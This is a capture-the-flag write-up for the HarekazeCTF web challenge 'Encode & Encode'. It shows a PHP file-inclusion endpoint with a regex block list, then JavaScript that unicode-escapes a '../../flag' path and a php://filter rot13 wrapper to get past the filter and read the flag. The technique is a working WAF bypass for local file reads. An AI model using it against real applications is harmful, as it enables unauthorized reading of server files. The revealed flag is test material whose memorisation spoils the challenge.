#  Encode & Encode

Category: Web<br/>
Author: st98

I made a strong WAF, so you definitely can’t read the flag!

## Solution

The important part of the source code is:

```php
 <?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]); 
```

There is a file inclusion which allows us to read the `flag` file. Unfortunately we can't use `..` to get to the flag.
It turns out that `json_decode` converts unicode codepoints into characters. With this the `is_valid` check can be
circumvented:

```js
const path = '../../../../flag';

const escapedPath = path.split('').map(c =>
     '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
).join('');

console.log(escapedPath);
```

This gives the (ceonsored) content of the flag: `HarekazeCTF{<censored>}`. To circumvent the data exfiltration I used
[the rot13 protocol / wrapper](https://www.php.net/manual/en/wrappers.php).

```js
const path = 'php://filter/read=string.rot13/resource=../../../../flag';

const escapedPath = path.split('').map(c =>
     '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
).join('');

console.log(escapedPath);
```

This returned `UnerxnmrPGS{ghehgnen_gnggnggn_evggn}` which can be rot13 decoded to
`HarekazeCTF{turutara_tattatta_ritta}`.
